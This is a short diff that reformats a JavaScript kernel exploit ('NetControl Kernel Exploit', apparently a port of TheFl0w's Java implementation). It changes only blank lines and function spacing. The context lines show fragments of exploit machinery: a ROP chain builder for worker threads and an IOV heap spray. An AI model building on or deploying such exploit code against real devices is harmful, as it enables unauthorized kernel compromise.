@@ -1,9 +1,5 @@
 include('inject.js')
 
-
-
-
-
 // ============================================================================
 // NetControl Kernel Exploit (NetControl port based on TheFl0w's Java impl)
 // ============================================================================
@@ -283,7 +279,7 @@ for (var w = 0; w < IOV_WORKER_NUM; w++) {
 log('Created ' + IOV_WORKER_NUM + ' worker slots')
 
 // Build ROP chain for a worker: read → recvmsg → write → read (blocks, keeping IOV alive)
-function buildWorkerROP(worker) {
+function buildWorkerROP (worker) {
   var rop = []
 
   // Wait for work signal: read(ctrl_sock0, buf, 1) - blocks until signaled
@@ -333,7 +329,7 @@ function buildWorkerROP(worker) {
 }
 
 // Spawn a worker thread
-function spawnWorker(worker_idx) {
+function spawnWorker (worker_idx) {
   var worker = workers[worker_idx]
 
   // Reset TID values
@@ -375,7 +371,7 @@ log('All workers spawned and waiting')
 var iov_spray_count = 0
 
 // IOV spray using persistent workers (they stay alive with IOV allocated)
-function doIOVSpray() {
+function doIOVSpray () {
   // Use round-robin to track which iteration we're on
   var iteration = iov_spray_count
   iov_spray_count++
